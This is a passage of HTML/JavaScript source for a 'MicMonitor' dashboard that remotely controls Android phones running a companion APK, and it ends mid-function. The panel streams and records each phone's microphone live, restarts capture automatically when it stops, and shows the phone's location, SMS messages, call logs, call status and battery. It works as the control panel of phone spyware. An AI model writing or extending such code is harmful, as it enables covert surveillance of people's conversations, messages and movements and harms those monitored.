<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MicMonitor Dashboard</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" crossorigin />
    <style>
      :root {
        --bg:      #080c14;
        --surface: #0e1420;
        --card:    #111827;
        --border:  #1e2d45;
        --border2: #243352;
        --accent:  #3b82f6;
        --accent2: #60a5fa;
        --green:   #22c55e;
        --red:     #ef4444;
        --amber:   #f59e0b;
        --cyan:    #06b6d4;
        --text:    #e2e8f0;
        --text2:   #94a3b8;
        --text3:   #475569;
        --mono:    "JetBrains Mono", monospace;
      }
      * { box-sizing: border-box; margin: 0; padding: 0; }
      body { font-family: "Inter","Segoe UI",sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; padding: 24px 20px; }
      ::-webkit-scrollbar { width: 5px; height: 5px; }
      ::-webkit-scrollbar-track { background: transparent; }
      ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 4px; }

      /* Header */
      .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; }
      .header-left { display: flex; align-items: center; gap: 14px; }
      .logo { width: 42px; height: 42px; background: linear-gradient(135deg,#1d4ed8,#7c3aed); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; box-shadow: 0 0 20px rgba(59,130,246,.35); }
      .header-title { font-size: 20px; font-weight: 700; letter-spacing: -.3px; }
      .header-sub { font-size: 12px; color: var(--text3); margin-top: 2px; }

      /* Connection pill */
      .conn-pill { display: flex; align-items: center; gap: 8px; background: var(--surface); border: 1px solid var(--border); border-radius: 999px; padding: 7px 14px; font-size: 12px; font-weight: 500; color: var(--text2); transition: border-color .3s, color .3s; }
      .conn-pill.ok { border-color: rgba(34,197,94,.4); color: var(--green); }
      .conn-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--red); transition: background .3s; }
      .conn-dot.connected { background: var(--green); box-shadow: 0 0 8px rgba(34,197,94,.7); animation: pulse 2s infinite; }
      @keyframes pulse { 0%,100%{box-shadow:0 0 6px rgba(34,197,94,.6)} 50%{box-shadow:0 0 14px rgba(34,197,94,.9)} }

      /* Layout */
      .section-label { font-size: 11px; font-weight: 600; letter-spacing: .08em; text-transform: uppercase; color: var(--text3); margin-bottom: 10px; }
      .bottom-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 16px; }
      @media(max-width:700px){ .bottom-row{ grid-template-columns:1fr; } }

      /* Devices */
      #devicesContainer { display: flex; flex-direction: column; gap: 14px; }
      #noDevices { background: var(--surface); border: 1px dashed var(--border2); border-radius: 14px; padding: 48px 24px; text-align: center; color: var(--text3); font-size: 14px; line-height: 1.8; }
      #noDevices .nd-icon { font-size: 40px; display: block; margin-bottom: 12px; }

      /* Device card */
      .device-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; transition: border-color .3s; }
      .device-card:hover { border-color: var(--border2); }
      .device-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 4px; }
      .device-name { font-size: 15px; font-weight: 700; color: var(--accent2); display: flex; align-items: center; gap: 8px; }
      .device-name::before { content:''; display:inline-block; width:8px; height:8px; border-radius:50%; background:var(--green); box-shadow:0 0 8px rgba(34,197,94,.6); }
      .device-badge { font-size: 10px; font-weight: 700; letter-spacing: .06em; padding: 3px 10px; border-radius: 999px; background: rgba(34,197,94,.12); color: var(--green); border: 1px solid rgba(34,197,94,.25); transition: all .2s; }
      .device-badge.recording { background: rgba(239,68,68,.15); color: var(--red); border-color: rgba(239,68,68,.3); }
      .device-meta { font-size: 11px; color: var(--text3); font-family: var(--mono); margin-bottom: 14px; margin-top: 4px; }
      .health-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 6px; margin: 0 0 12px; }
      @media(max-width:900px){ .health-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
      .health-item { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 6px 8px; }
      .health-label { color: var(--text3); font-size: 9px; text-transform: uppercase; letter-spacing: .07em; }
      .health-val { color: var(--text); font-size: 11px; font-family: var(--mono); margin-top: 2px; }
      .br-badge { display: inline-block; min-width: 46px; text-align: center; border-radius: 999px; padding: 1px 8px; font-size: 10px; font-weight: 700; letter-spacing: .03em; border: 1px solid transparent; }
      .br-low { color: #fecaca; background: rgba(239,68,68,.16); border-color: rgba(239,68,68,.35); }
      .br-mid { color: #fde68a; background: rgba(245,158,11,.16); border-color: rgba(245,158,11,.35); }
      .br-high { color: #86efac; background: rgba(34,197,94,.16); border-color: rgba(34,197,94,.35); }
      .ok-text { color: var(--green); }
      .bad-text { color: var(--red); }

      /* Waveform */
      .canvas-wrap { background: #0a1628; border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin-bottom: 14px; position: relative; }
      .canvas-wrap canvas { width: 100%; height: 56px; display: block; }
      .canvas-label { position: absolute; top: 6px; left: 10px; font-size: 9px; font-weight: 600; letter-spacing: .08em; text-transform: uppercase; color: var(--text3); }

      /* Buttons */
      .btn-row { display: flex; gap: 7px; flex-wrap: wrap; margin-bottom: 14px; }
      button { font-family: "Inter",sans-serif; border: none; border-radius: 8px; cursor: pointer; padding: 8px 14px; font-size: 12px; font-weight: 600; transition: all .15s; display: flex; align-items: center; gap: 5px; white-space: nowrap; }
      button:hover:not(:disabled) { transform: translateY(-1px); filter: brightness(1.12); }
      button:active:not(:disabled) { transform: translateY(0); }
      button:disabled { opacity: .35; cursor: not-allowed; }
      .btn-live  { background: #1d4ed8; color: #fff; box-shadow: 0 2px 8px rgba(29,78,216,.4); }
      .btn-live.active { background: #7c3aed; box-shadow: 0 2px 8px rgba(124,58,237,.4); }
      .btn-rec   { background: #991b1b; color: #fff; box-shadow: 0 2px 8px rgba(153,27,27,.4); }
      .btn-stop  { background: #1e293b; color: var(--text2); border: 1px solid var(--border2); }
      .btn-ghost { background: #0f2040; color: var(--accent2); border: 1px solid rgba(59,130,246,.2); }
      .btn-rtc   { background: #065f46; color: #fff; box-shadow: 0 2px 8px rgba(6,95,70,.4); }
      .btn-rtc.active { background: #047857; box-shadow: 0 2px 8px rgba(4,120,87,.5); }

      /* Tabs */
      .tab-bar { display: flex; gap: 4px; flex-wrap: wrap; background: var(--surface); border-radius: 8px; padding: 4px; margin-bottom: 10px; }
      .tab-btn { flex: 1; background: transparent; border: none; border-radius: 6px; color: var(--text3); cursor: pointer; font-size: 11px; font-weight: 600; padding: 6px 8px; transition: all .15s; min-width: 60px; }
      .tab-btn:hover:not(.active) { color: var(--text2); background: rgba(255,255,255,.04); }
      .tab-btn.active { background: var(--accent); color: #fff; box-shadow: 0 1px 6px rgba(59,130,246,.4); }
      .tab-panel { display: none; max-height: 220px; overflow-y: auto; font-size: 12px; border-radius: 8px; background: var(--surface); padding: 4px; }
      .tab-panel.active { display: block; }
      .data-row { padding: 7px 10px; border-radius: 6px; border-bottom: 1px solid var(--border); line-height: 1.6; }
      .data-row:last-child { border-bottom: none; }
      .data-row:hover { background: rgba(255,255,255,.03); }
      .data-label { color: var(--text3); font-size: 10px; text-transform: uppercase; letter-spacing: .06em; }
      .data-val   { color: var(--text); word-break: break-all; }
      .data-badge { display: inline-block; border-radius: 4px; padding: 1px 7px; font-size: 9px; font-weight: 700; letter-spacing: .05em; text-transform: uppercase; margin-left: 6px; }
      .badge-in     { background:rgba(34,197,94,.15);  color:#86efac; border:1px solid rgba(34,197,94,.2); }
      .badge-out    { background:rgba(59,130,246,.15); color:#93c5fd; border:1px solid rgba(59,130,246,.2); }
      .badge-missed { background:rgba(239,68,68,.15);  color:#fca5a5; border:1px solid rgba(239,68,68,.2); }
      .badge-inbox  { background:rgba(6,182,212,.12);  color:#67e8f9; border:1px solid rgba(6,182,212,.2); }
      .badge-sent   { background:rgba(167,139,250,.12);color:#c4b5fd; border:1px solid rgba(167,139,250,.2); }
      .badge-unread { background:rgba(245,158,11,.15); color:#fcd34d; font-size:8px; margin-left:4px; border:1px solid rgba(245,158,11,.2); }

      /* Sidebar panels */
      .sidebar { display: flex; flex-direction: column; gap: 14px; }
      .panel { background: var(--card); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; }
      .panel-head { display: flex; align-items: center; justify-content: space-between; padding: 14px 16px 0; }
      .panel-title { font-size: 12px; font-weight: 700; color: var(--text2); text-transform: uppercase; letter-spacing: .07em; display: flex; align-items: center; gap: 7px; }
      .panel-title .pi { font-size: 14px; }
      .panel-body { padding: 12px 16px 16px; }

      /* Recordings */
      #globalRecList { display: flex; flex-direction: column; gap: 6px; }
      .rec-item { display: flex; align-items: center; justify-content: space-between; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 8px 12px; transition: border-color .15s; }
      .rec-item:hover { border-color: var(--border2); }
      .rec-item a { color: var(--cyan); text-decoration: none; font-size: 11px; font-family: var(--mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 190px; }
      .rec-item a:hover { color: var(--accent2); text-decoration: underline; }
      .rec-size { color: var(--text3); font-size: 10px; font-family: var(--mono); flex-shrink: 0; margin-left: 8px; }
      .rec-empty { color: var(--text3); font-size: 12px; text-align: center; padding: 20px 0; }
      .rec-list { margin-bottom: 10px; display: flex; flex-direction: column; gap: 5px; }
      .rec-list .rec-item a { max-width: none; font-size: 11px; }

      /* Log */
      #logOutput { font-family: var(--mono); font-size: 11px; color: var(--text2); height: 200px; overflow-y: auto; line-height: 1.7; }
      .log-entry { padding: 1px 0; display: flex; gap: 8px; align-items: baseline; }
      .log-ts   { color: var(--text3); font-size: 10px; flex-shrink: 0; }
      .log-info { color: var(--accent2); }
      .log-warn { color: var(--amber); }
      .log-ok   { color: var(--green); }
      .log-err  { color: var(--red); }
    </style>
  </head>
  <body>
    <div class="header">
      <div class="header-left">
        <div class="logo">🎙</div>
        <div>
          <div class="header-title">MicMonitor</div>
          <div class="header-sub">Remote audio dashboard</div>
        </div>
      </div>
      <div class="conn-pill" id="connPill">
        <div id="wsDot" class="conn-dot"></div>
        <span id="wsStatus">Connecting…</span>
      </div>
    </div>

    <div class="section-label">Connected Devices</div>
    <div id="devicesContainer">
      <div id="noDevices">
        <span class="nd-icon">📵</span>
        No devices connected yet.<br />
        Install the APK and grant microphone permission.
      </div>
    </div>

    <div class="bottom-row">
      <div class="panel">
        <div class="panel-head">
          <div class="panel-title"><span class="pi">📂</span> Recordings</div>
        </div>
        <div class="panel-body">
          <div id="globalRecList"><div class="rec-empty">No recordings yet.</div></div>
        </div>
      </div>
      <div class="panel">
        <div class="panel-head">
          <div class="panel-title"><span class="pi">📋</span> Event Log</div>
        </div>
        <div class="panel-body" style="padding-top:8px">
          <div id="logOutput"></div>
        </div>
      </div>
    </div>

    <script>
      const _wsProto = location.protocol === "https:" ? "wss" : "ws";
      const _wsHost = location.port ? `${location.hostname}:${location.port}` : location.hostname;
      let webRtcConfig = {
        iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }],
        tokenRequired: false,
      };

      let controlWs = null;
      const deviceState = {};

      function connectControlWs() {
        controlWs = new WebSocket(`${_wsProto}://${_wsHost}/control`);
        controlWs.binaryType = "arraybuffer";
        controlWs.onopen = () => { setWsStatus(true); log("Connected to server", "ok"); };
        controlWs.onclose = () => {
          setWsStatus(false);
          log("Disconnected — reconnecting in 3s…", "warn");
          // Clear all device cards so they're rebuilt fresh on reconnect
          Object.keys(deviceState).forEach((id) => removeDeviceCard(id));
          setTimeout(connectControlWs, 3000);
        };
        controlWs.onerror = () => { log("WebSocket error", "err"); };
        controlWs.onmessage = (event) => {
          if (typeof event.data === "string") handleJsonMessage(JSON.parse(event.data));
          else handleAudioBinary(event.data);
        };
      }

      function handleJsonMessage(msg) {
        switch (msg.type) {
          case "device_list":        msg.devices.forEach((d) => addDeviceCard(d.deviceId, d.model, d.health || null)); break;
          case "device_connected":   addDeviceCard(msg.deviceId, msg.model || "…", msg.health || null); log(`Device connected: ${msg.deviceId}`, "ok"); break;
          case "device_disconnected": removeDeviceCard(msg.deviceId); log(`Device disconnected: ${msg.deviceId}`, "warn"); break;
          case "device_info":        updateDeviceMeta(msg.deviceId, msg.model, msg.sdk); log(`${msg.deviceId} → ${msg.model} (SDK ${msg.sdk})`, "info"); break;
          case "device_health":      renderDeviceHealth(msg.deviceId, msg.health || null); break;

          case "recording_started":  markRecording(msg.deviceId, true, msg.filename); log(`⏺ Recording started: ${msg.filename}`, "ok"); break;
          case "recording_stopped":  markRecording(msg.deviceId, false, msg.filename); log(`⏹ Recording saved: ${msg.filename}`, "ok"); refreshRecordingsList(); break;
          case "recording_saved":    log(`💾 Device saved: ${msg.filename}`, "info"); refreshRecordingsList(); break;
          case "ack":                log(`ACK ${msg.deviceId}: ${msg.message}`, "info"); break;
          case "device_data":        renderDeviceData(msg.deviceId, msg.data); break;
          case "webrtc_answer":      onWebRtcAnswer(msg.deviceId, msg.sdp); break;
          case "webrtc_ice":         onWebRtcIce(msg.deviceId, msg.candidate); break;
          case "webrtc_state":       renderWebRtcState(msg.deviceId, msg.state, msg.bitrateKbps, msg.quality || null); log(`WebRTC ${msg.deviceId}: ${msg.state || "state"}${msg.bitrateKbps ? ` (${msg.bitrateKbps} kbps)` : ""}`, "info"); break;
          case "error":              handleServerError(msg.message); break;
        }
      }

      function handleServerError(message) {
        log(`Error: ${message}`, "err");
        const m = /Device\s+([a-f0-9\-]+)\s+not found/i.exec(String(message || ""));
        if (!m) return;
        const missingId = m[1];
        const state = deviceState[missingId];
        if (!state) return;
        if (!state.useWebRtc || state.rtcConnected) return;
        if (state.webRtcRetryOnNotFoundDone) return;
        state.webRtcRetryOnNotFoundDone = true;
        log(`Refreshing device map and retrying WebRTC once for ${missingId}`, "warn");
        sendCmd(missingId, "get_data");
        sendCmd(missingId, "ping");
        setTimeout(async () => {
          if (!state.useWebRtc || state.rtcConnected || !state.rtcPeer) return;
          try {
            const offer = await state.rtcPeer.createOffer({ iceRestart: true });
            await state.rtcPeer.setLocalDescription(offer);
            sendCmd(missingId, "webrtc_start");
            sendCmd(missingId, "webrtc_offer", { sdp: offer.sdp });
            log(`WebRTC retry offer sent for ${missingId}`, "ok");
          } catch (e) {
            log(`WebRTC retry failed for ${missingId}: ${e.message}`, "err");
          }
        }, 800);
      }

      function handleAudioBinary(data) {
        // Binary frame format: [2-byte idLen][deviceId utf8][PCM int16 LE]
        const view = new DataView(data);
        const idLen = view.getUint16(0);
        const deviceId = new TextDecoder().decode(new Uint8Array(data, 2, idLen));
        const state = deviceState[deviceId];
        if (!state || !state.isLive) return;
        if (state.useWebRtc && state.rtcConnected) return;
        const pcmBytes = new Uint8Array(data, 2 + idLen);
        const int16 = new Int16Array(pcmBytes.buffer, pcmBytes.byteOffset, pcmBytes.byteLength >> 1);
        const float32 = new Float32Array(int16.length);
        for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
        if (state.health) {
          state.health.lastAudioChunkAt = Date.now();
          state.health.micCapturing = true;
          renderDeviceHealth(deviceId, state.health);
        }
        playAudioChunk(state, float32);
        drawWaveform(state.canvas, float32);
      }

      function addDeviceCard(deviceId, model, health) {
        if (deviceState[deviceId] && document.getElementById(`card_${deviceId}`)) { markRecording(deviceId, false, null); return; }
        // Clean up stale state if card was removed
        if (deviceState[deviceId] && !document.getElementById(`card_${deviceId}`)) { delete deviceState[deviceId]; }
        document.getElementById("noDevices").style.display = "none";
        const card = document.createElement("div");
        card.className = "device-card";
        card.id = `card_${deviceId}`;
        card.innerHTML = `
          <div class="device-header">
            <span class="device-name">${deviceId.substring(0,8)}…</span>
            <span class="device-badge" id="badge_${deviceId}">LIVE</span>
          </div>
          <div class="device-meta" id="meta_${deviceId}">${model || "Unknown"}</div>
          <div class="health-grid" id="health_${deviceId}">
            <div class="health-item"><div class="health-label">WebSocket</div><div class="health-val" id="hws_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">Mic Capture</div><div class="health-val" id="hmic_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">Last Audio</div><div class="health-val" id="haud_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">Last Health</div><div class="health-val" id="hhb_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">WebRTC</div><div class="health-val" id="hrtc_${deviceId}">idle</div></div>
            <div class="health-item"><div class="health-label">RTC In Level</div><div class="health-val" id="hrms_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">RTP Rx/s</div><div class="health-val" id="hrx_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">Bitrate</div><div class="health-val" id="hbr_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">Quality</div><div class="health-val" id="hq_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">Call Status</div><div class="health-val" id="hcall_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">Internet</div><div class="health-val" id="hnet_${deviceId}">-</div></div>
            <div class="health-item"><div class="health-label">Battery</div><div class="health-val" id="hbat_${deviceId}">-</div></div>
          </div>
          <div class="canvas-wrap">
            <span class="canvas-label">AUDIO</span>
            <canvas id="canvas_${deviceId}" width="600" height="56"></canvas>
          </div>
          <div class="btn-row">
            <button class="btn-live"  id="btnLive_${deviceId}" onclick="toggleLive('${deviceId}')">▶ Live Listen</button>
            <button class="btn-rtc"   id="btnRtc_${deviceId}" onclick="toggleWebRtc('${deviceId}')">⚡ WebRTC</button>
            <button class="btn-rec"   id="btnRec_${deviceId}"  onclick="startRecord('${deviceId}')">⏺ Record</button>
            <button class="btn-stop"  id="btnStop_${deviceId}" onclick="stopRecord('${deviceId}')" disabled>⏹ Stop</button>
            <button class="btn-ghost" onclick="recoverMic('${deviceId}')">🎤 Recover Mic</button>
            <button class="btn-ghost" onclick="pingDevice('${deviceId}')">🏓 Ping</button>
            <button class="btn-ghost" onclick="refreshData('${deviceId}')">↻ Data</button>
          </div>
          <div class="rec-list" id="recList_${deviceId}"></div>
          <div class="tab-bar">
            <button class="tab-btn active" onclick="openTab('${deviceId}','location',this)">📍 Location</button>
            <button class="tab-btn"        onclick="openTab('${deviceId}','sms',this)">💬 SMS</button>
            <button class="tab-btn"        onclick="openTab('${deviceId}','calls',this)">📞 Calls</button>
          </div>
          <div class="tab-panel active" id="tab_${deviceId}_location"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>
          <div class="tab-panel"        id="tab_${deviceId}_sms"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>
          <div class="tab-panel"        id="tab_${deviceId}_calls"><div class="data-row"><span class="data-label">Waiting for data…</span></div></div>`;
        document.getElementById("devicesContainer").appendChild(card);
        deviceState[deviceId] = {
          isLive: false,
          isRecording: false,
          audioCtx: null,
          nextPlayTime: 0,
          useWebRtc: false,
          rtcConnected: false,
          rtcPeer: null,
          rtcRetryCount: 0,
          rtcRestartTimer: null,
          rtcStatsTimer: null,
          rtcConnectDeadlineTimer: null,
          webRtcRetryOnNotFoundDone: false,
          remoteAudioEl: null,
          webRtcAudioCtx: null,
          webRtcSourceNode: null,
          webRtcAnalyserNode: null,
          webRtcMeterData: null,
          webRtcMeterTimer: null,
          webRtcInboundRms: 0,
          rtcRxPacketsPerSec: 0,
          rtcRxKbps: 0,
          rtcRxMetricText: "-",
          rtcLastPacketsReceived: null,
          rtcLastBytesReceived: null,
          rtcLastPacketsTs: null,
          webRtcGainNode: null,
          webRtcCompressorNode: null,
          webRtcAudioGraphConnected: false,
          lastRecoverTryAt: 0,
          canvas: document.getElementById(`canvas_${deviceId}`),
          health: health || { wsConnected: true, micCapturing: false, lastAudioChunkAt: 0, lastHealthAt: 0, reason: "init", webRtcState: "idle", bitrateKbps: null, quality: null, internetOnline: true, callActive: false, batteryPct: null, charging: null },
        };
        renderDeviceHealth(deviceId, deviceState[deviceId].health);
      }

      function removeDeviceCard(deviceId) {
        stopWebRtc(deviceId, false);
        const card = document.getElementById(`card_${deviceId}`);
        if (card) card.remove();
        delete deviceState[deviceId];
        if (Object.keys(deviceState).length === 0) document.getElementById("noDevices").style.display = "block";
      }

      function updateDeviceMeta(deviceId, model, sdk) {
        const el = document.getElementById(`meta_${deviceId}`);
        if (el) el.textContent = `${model} · Android SDK ${sdk}`;
      }

      function renderDeviceHealth(deviceId, health) {
        const state = deviceState[deviceId];
        if (!state) return;
        if (health) state.health = { ...state.health, ...health };
        const h = state.health || {};
        const ws = document.getElementById(`hws_${deviceId}`);
        const mic = document.getElementById(`hmic_${deviceId}`);
        const aud = document.getElementById(`haud_${deviceId}`);
        const hb = document.getElementById(`hhb_${deviceId}`);
        const rtc = document.getElementById(`hrtc_${deviceId}`);
        const rms = document.getElementById(`hrms_${deviceId}`);
        const rx = document.getElementById(`hrx_${deviceId}`);
        const br = document.getElementById(`hbr_${deviceId}`);
        const q = document.getElementById(`hq_${deviceId}`);
        const call = document.getElementById(`hcall_${deviceId}`);
        const net = document.getElementById(`hnet_${deviceId}`);
        const bat = document.getElementById(`hbat_${deviceId}`);
        const rtcState = String(h.webRtcState || "idle");
        const webrtcMicActive = /started|answer_sent|ice_connected|ice_completed|pc_connected|bitrate_/i.test(rtcState);
        if (ws) ws.innerHTML = h.wsConnected ? `<span class="ok-text">connected</span>` : `<span class="bad-text">disconnected</span>`;
        const micRunning = state.useWebRtc ? state.rtcConnected : (h.micCapturing || webrtcMicActive);
        if (mic) mic.innerHTML = micRunning
          ? `<span class="ok-text">running</span>`
          : (state.useWebRtc && !state.rtcConnected && state.rtcPeer)
            ? `<span style="color:var(--amber)">connecting…</span>`
            : `<span class="bad-text">stopped</span>`;
        if (aud) aud.textContent = h.lastAudioChunkAt ? formatAgo(h.lastAudioChunkAt) : "never";
        if (hb) hb.textContent = h.lastHealthAt ? `${formatAgo(h.lastHealthAt)} (${h.reason || "-"})` : "never";
        if (rtc) {
          const st = rtcState;
          const isGood = /connected|started|answer_sent|bitrate/.test(st);
          rtc.innerHTML = isGood ? `<span class="ok-text">${st}</span>` : st;
        }
        if (rms) {
          const pct = Math.max(0, Math.min(100, Math.round(Number(state.webRtcInboundRms || 0) * 100)));
          const cls = pct >= 8 ? "ok-text" : (pct > 0 ? "" : "bad-text");
          rms.innerHTML = `<span class="${cls}">${pct}%</span>`;
        }
        if (rx) {
          const v = Number(state.rtcRxPacketsPerSec || 0);
          const kb = Number(state.rtcRxKbps || 0);
          const hasFlow = v > 0 || kb > 0;
          const cls = hasFlow ? "ok-text" : "bad-text";
          rx.innerHTML = `<span class="${cls}">${state.rtcRxMetricText || "-"}</span>`;
        }
        if (br) br.innerHTML = renderBitrateBadge(h.bitrateKbps);
        if (q) q.textContent = renderQualitySummary(h.quality);
        if (call) call.innerHTML = h.callActive ? `<span class="bad-text">on call</span>` : `<span class="ok-text">idle</span>`;
        if (net) net.innerHTML = h.internetOnline === false ? `<span class="bad-text">offline</span>` : `<span class="ok-text">online</span>`;
        if (bat) bat.innerHTML = renderBatterySummary(h.batteryPct, h.charging);

        // Auto-recover if user is in live mode but mic stopped (skip during WebRTC connect — deadline timer handles fallback).
        if (state.isLive && h.wsConnected && !micRunning && !state.rtcConnectDeadlineTimer) {
          const now = Date.now();
          if (!state.lastRecoverTryAt || (now - state.lastRecoverTryAt) > 12000) {
            state.lastRecoverTryAt = now;
            sendCmd(deviceId, "start_stream");
            log(`Mic recovery command sent to ${deviceId}`, "warn");
          }
        }
      }

      function formatAgo(ts) {
        const s = Math.max(0, Math.floor((Date.now() - Number(ts)) / 1000));
        if (s < 5) return "just now";
        if (s < 60) return `${s}s ago`;
        const m = Math.floor(s / 60);
        if (m < 60) return `${m}m ago`;
        const h = Math.floor(m / 60);
        return `${h}h ago`;
      }

      function markRecording(deviceId, active, filename) {
        const state = deviceState[deviceId];
        if (!state) return;
        state.isRecording = active;
        const btnRec  = document.getElementById(`btnRec_${deviceId}`);
        const btnStop = document.getElementById(`btnStop_${deviceId}`);
        if (btnRec)  btnRec.disabled  = active;
        if (btnStop) btnStop.disabled = !active;
        const badge = document.getElementById(`badge_${deviceId}`);
        if (badge) { badge.textContent = active ? "⏺ REC" : "LIVE"; badge.className = "device-badge" + (active ? " recording" : ""); }
        if (!active && filename) {
          const recList = document.getElementById(`recList_${deviceId}`);
          if (recList) {
            const entry = document.createElement("div");
            entry.className = "rec-item";
            entry.innerHTML = `<a href="/recordings/${filename}" download="${filename}" title="${filename}">⬇ ${filename}</a>`;
            recList.prepend(entry);
          }
        }
      }

      function sendCmd(deviceId, cmd, extra = null) {
        if (controlWs && controlWs.readyState === WebSocket.OPEN)
          controlWs.send(JSON.stringify({ cmd, deviceId, ...(extra || {}) }));
      }

      async function toggleLive(deviceId) {
        const state = deviceState[deviceId];
        if (!state) return;
        const btn = document.getElementById(`btnLive_${deviceId}`);
        if (state.isLive) {
          state.isLive = false;
          if (state.useWebRtc) stopWebRtc(deviceId, true);
          if (state.audioCtx) { state.audioCtx.close(); state.audioCtx = null; }
          btn.textContent = "▶ Live Listen"; btn.classList.remove("active");
          clearCanvas(state.canvas);
          log(`Stopped live listen for ${deviceId}`, "info");
        } else {
          state.isLive = true;
          state.audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000, latencyHint: "interactive" });
          // Proactively resume in case browser suspended it
          if (state.audioCtx.state === "suspended") state.audioCtx.resume();
          state.nextPlayTime = state.audioCtx.currentTime;
          btn.textContent = "⏸ Stop Listen"; btn.classList.add("active");
          const ok = await startWebRtc(deviceId, state);
          if (!ok) {
            sendCmd(deviceId, "start_stream");
            log(`WebRTC unavailable for ${deviceId} — using PCM fallback`, "warn");
          } else {
            log(`Started live listen for ${deviceId} (WebRTC)`, "ok");
          }
        }
      }

      function startRecord(deviceId)  { sendCmd(deviceId, "start_record"); }
      function stopRecord(deviceId)   { sendCmd(deviceId, "stop_record"); }
      function recoverMic(deviceId)   { sendCmd(deviceId, "start_stream"); log(`Manual mic recovery sent to ${deviceId}`, "warn"); }
      function pingDevice(deviceId)   { sendCmd(deviceId, "ping"); log(`Pinged ${deviceId}`, "info"); }
      function refreshData(deviceId)  { sendCmd(deviceId, "get_data"); log(`Data refresh requested for ${deviceId}`, "info"); }

      function renderWebRtcState(deviceId, state, bitrateKbps, quality) {
        if (!deviceState[deviceId]) addDeviceCard(deviceId, "Unknown", null);
        const st = deviceState[deviceId];
        st.health = st.health || {};
        st.health.webRtcState = state || st.health.webRtcState || "state";
        if (Number.isFinite(Number(bitrateKbps))) st.health.bitrateKbps = Number(bitrateKbps);
        if (quality && typeof quality === "object") st.health.quality = quality;
        if (String(state || "").includes("need_reoffer")) {
          scheduleIceRecovery(deviceId, st, "device_requested");
        }
        renderDeviceHealth(deviceId, st.health);
      }

      function renderBitrateBadge(bitrateKbps) {
        const b = Number(bitrateKbps);
        if (!Number.isFinite(b) || b <= 0) return "-";
        const cls = b <= 12 ? "br-low" : (b <= 24 ? "br-mid" : "br-high");
        return `<span class="br-badge ${cls}">${Math.round(b)} kbps</span>`;
      }

      function renderQualitySummary(quality) {
        if (!quality) return "-";
        const rtt = Number.isFinite(Number(quality.rttMs)) ? `${Math.round(Number(quality.rttMs))}ms` : "-";
        const loss = Number.isFinite(Number(quality.lossPct)) ? `${Number(quality.lossPct).toFixed(1)}%` : "-";
        const jitter = Number.isFinite(Number(quality.jitterMs)) ? `${Math.round(Number(quality.jitterMs))}ms` : "-";
        return `rtt ${rtt} | loss ${loss} | jit ${jitter}`;
      }

      function renderBatterySummary(batteryPct, charging) {
        const p = Number(batteryPct);
        const pctText = Number.isFinite(p) && p >= 0 ? `${Math.round(p)}%` : "-";
        if (charging === true) return `<span class="ok-text">${pctText} (charging)</span>`;
        if (charging === false) return `${pctText} (discharging)`;
        return pctText;
      }

      async function toggleWebRtc(deviceId) {
        const state = deviceState[deviceId];
        if (!state) return;
        if (!state.useWebRtc) await startWebRtc(deviceId, state);
        else stopWebRtc(deviceId, true);
      }

      async function startWebRtc(deviceId, state) {
        if (state.rtcPeer) stopWebRtc(deviceId, false);
        let pc;
        try {
          pc = new RTCPeerConnection({
            iceServers: webRtcConfig.iceServers,
          });
        } catch (e) {
          log(`WebRTC init failed for ${deviceId}: ${e.message}`, "err");
          return false;
        }
        state.rtcPeer = pc;
        state.useWebRtc = true;
        state.rtcConnected = false;
        state.isLive = true;
        state.rtcRetryCount = 0;
        state.webRtcRetryOnNotFoundDone = false;

        if (!state.remoteAudioEl) {
          state.remoteAudioEl = document.createElement("audio");
          state.remoteAudioEl.autoplay = true;
          state.remoteAudioEl.playsInline = true;
        }

        pc.ontrack = (evt) => {
          setupWebRtcPlaybackBoost(deviceId, state, evt.streams[0]);
          state.rtcConnected = true;
          state.rtcRetryCount = 0;
          if (state.rtcConnectDeadlineTimer) {
            clearTimeout(state.rtcConnectDeadlineTimer);
            state.rtcConnectDeadlineTimer = null;
          }
          if (state.rtcRestartTimer) {
            clearTimeout(state.rtcRestartTimer);
            state.rtcRestartTimer = null;
          }
          startStatsLoop(deviceId, state);
          log(`WebRTC track active for ${deviceId}`, "ok");
        };

        pc.onicecandidate = (evt) => {
          if (!evt.candidate) return;
          sendCmd(deviceId, "webrtc_ice", { candidate: evt.candidate });
        };

        pc.oniceconnectionstatechange = () => {
          const s = pc.iceConnectionState;
          if (s === "connected" || s === "completed") {
            state.rtcConnected = true;
            state.rtcRetryCount = 0;
          }
          if (s === "failed" || s === "disconnected") {
            state.rtcConnected = false;
            scheduleIceRecovery(deviceId, state, s);
          }
          if (s === "closed") state.rtcConnected = false;
          log(`WebRTC ICE ${deviceId}: ${s}`, s === "failed" ? "warn" : "info");
        };

